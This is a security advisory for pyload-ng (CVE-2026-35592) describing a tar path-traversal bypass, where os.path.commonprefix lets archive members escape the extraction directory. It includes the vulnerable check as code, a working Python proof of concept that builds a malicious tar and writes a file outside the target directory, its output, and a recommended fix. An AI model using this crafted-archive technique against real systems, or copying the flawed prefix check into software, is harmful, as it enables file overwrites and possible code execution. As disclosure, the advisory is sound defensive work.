# [M] pyload-ng: Incomplete Tar Path Traversal Fix in UnTar._safe_extractall via os.path.commonprefix Bypass

## Summary
Severity: Medium
Advisory: GHSA-mvwx-582f-56r7
CVE: CVE-2026-35592
CWE: CWE-22
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:H/A:N (CVSS_V3)
Published: 2026-04-08
Source: https://github.com/advisories/GHSA-mvwx-582f-56r7
Type: github-advisory

## Affected
- PyPI: `pyload-ng` — affected >=0 <0.5.0b3.dev97

## Details
## Summary

The `_safe_extractall()` function in `src/pyload/plugins/extractors/UnTar.py` uses `os.path.commonprefix()` for its path traversal check, which performs character-level string comparison rather than path-level comparison. This allows a specially crafted tar archive to write files outside the intended extraction directory. The correct function `os.path.commonpath()` was added to the codebase in the GHSA-7g4m-8hx2-4qh3 fix (commit 5f4f0fa) but was never applied to `_safe_extractall()`, making this an incomplete fix.

## Details

The GHSA-7g4m-8hx2-4qh3 fix (commit 5f4f0fa) added a correct `is_within_directory()` function to `src/pyload/core/utils/fs.py:384-391` using `os.path.commonpath()`:

```python
# fs.py:384 — CORRECT implementation
def is_within_directory(base_dir, target_dir):
    real_base = os.path.realpath(base_dir)
    real_target = os.path.realpath(target_dir)
    return os.path.commonpath([real_base, real_target]) == real_base
```

However, the `_safe_extractall()` function in `UnTar.py:10-22` was left unchanged with the broken `os.path.commonprefix()`:

```python
# UnTar.py:10-22 — VULNERABLE implementation
def _safe_extractall(tar, path=".", members=None, *, numeric_owner=False):
    def _is_within_directory(directory, target):
        abs_directory = os.path.abspath(directory)
        abs_target = os.path.abspath(target)
        prefix = os.path.commonprefix([abs_directory, abs_target])  # BUG: line 14
        return prefix == abs_directory

    for member in tar.getmembers():
        member_path = os.path.join(path, member.name)
        if not _is_within_directory(path, member_path):
            raise ArchiveError("Attempted Path Traversal in Tar File (CVE-2007-4559)")

    tar.extractall(path, members, numeric_owner=numeric_owner)
```

`os.path.commonprefix()` is a **string operation**, not a path operation. For extraction destination `/downloads/pkg` and a malicious member `../pkg_evil/payload` (resolving to `/downloads/pkg_evil/payload`):

- `commonprefix(['/downloads/pkg', '/downloads/pkg_evil/payload'])` → `'/downloads/pkg'` — **equals the directory, check passes**
- `commonpath(['/downloads/pkg', '/downloads/pkg_evil/payload'])` → `'/downloads'` — **does NOT equal the directory, check correctly fails**

The extraction path is reached via: `ExtractArchive.package_finished()` (line 182) → `extract_queued()` → `UnTar.extract()` (line 76) → `_safe_extractall(t, self.dest)` (line 81).

## PoC

Self-contained proof of concept demonstrating the bypass:

```python
import tarfile, io, os, shutil

dest = '/tmp/test_extraction_dir'
shutil.rmtree(dest, ignore_errors=True)
shutil.rmtree('/tmp/test_extraction_dir_pwned', ignore_errors=True)
os.makedirs(dest, exist_ok=True)

# Step 1: Create malicious tar with member that escapes via prefix trick
with tarfile.open('/tmp/evil.tar.gz', 'w:gz') as tar:
    info = tarfile.TarInfo(name='../test_extraction_dir_pwned/evil.txt')
    data = b'escaped the sandbox!'
    info.size = len(data)
    tar.addfile(info, io.BytesIO(data))

# Step 2: Reproduce the vulnerable check from UnTar.py:11-15
def _is_within_directory(directory, target):
    abs_directory = os.path.abspath(directory)
    abs_target = os.path.abspath(target)
    prefix = os.path.commonprefix([abs_directory, abs_target])
    return prefix == abs_directory

# Step 3: Verify the check is bypassed
with tarfile.open('/tmp/evil.tar.gz') as tar:
    for member in tar.getmembers():
        member_path = os.path.join(dest, member.name)
        bypassed = _is_within_directory(dest, member_path)
        print(f'Member: {member.name}')
        print(f'Resolved: {os.path.abspath(member_path)}')
        print(f'Check passes (should be False): {bypassed}')
    tar.extractall(dest)

# Step 4: Confirm file was written outside extraction directory
escaped_file = '/tmp/test_extraction_dir_pwned/evil.txt'
assert os.path.exists(escaped_file), "File did not escape"
print(f'File escaped to: {escaped_file}')
print(f'Content: {open(escaped_file).read()}')
```

Output:
```
Member: ../test_extraction_dir_pwned/evil.txt
Resolved: /tmp/test_extraction_dir_pwned/evil.txt
Check passes (should be False): True
File escaped to: /tmp/test_extraction_dir_pwned/evil.txt
Content: escaped the sandbox!
```

## Impact

An attacker who hosts a malicious `.tar.gz` archive on a file hosting service can write files to arbitrary sibling directories of the extraction path when a pyLoad user downloads and extracts the archive. This enables:

- Writing files outside the intended extraction directory into adjacent directories
- Overwriting other users' downloads
- Planting malicious files in predictable locations on disk
- If combined with other primitives (e.g., writing a `.bashrc`, cron job, or plugin file), this could lead to code execution

The attack requires the victim to download a malicious archive (either manually or via the pyLoad API with ADD permission) and have the ExtractArchive addon enabled.

## Recommended Fix

Replace the broken inline `_is_within_directory` with the correct `is_within_directory` from `pyload.core.utils.fs`:

```python
import os
import sys
import tarfile

from pyload.core.utils.fs import is_within_directory, safejoin
from pyload.plugins.base.extractor import ArchiveError, BaseExtractor, CRCError


# Fix for tarfile CVE-2007-4559
def _safe_extractall(tar, path=".", members=None, *, numeric_owner=False):
    for member in tar.getmembers():
        member_path = os.path.join(path, member.name)
        if not is_within_directory(path, member_path):
            raise ArchiveError("Attempted Path Traversal in Tar File (CVE-2007-4559)")

    tar.extractall(path, members, numeric_owner=numeric_owner)
```

This removes the broken inline function and uses the already-existing correct implementation that was added in the GHSA-7g4m-8hx2-4qh3 fix.

## References
- https://github.com/pyload/pyload/security/advisories/GHSA-mvwx-582f-56r7
- https://nvd.nist.gov/vuln/detail/CVE-2026-35592
- https://github.com/pyload/pyload
- https://github.com/pypa/advisory-database/tree/main/vulns/pyload-ng/PYSEC-2026-124.yaml
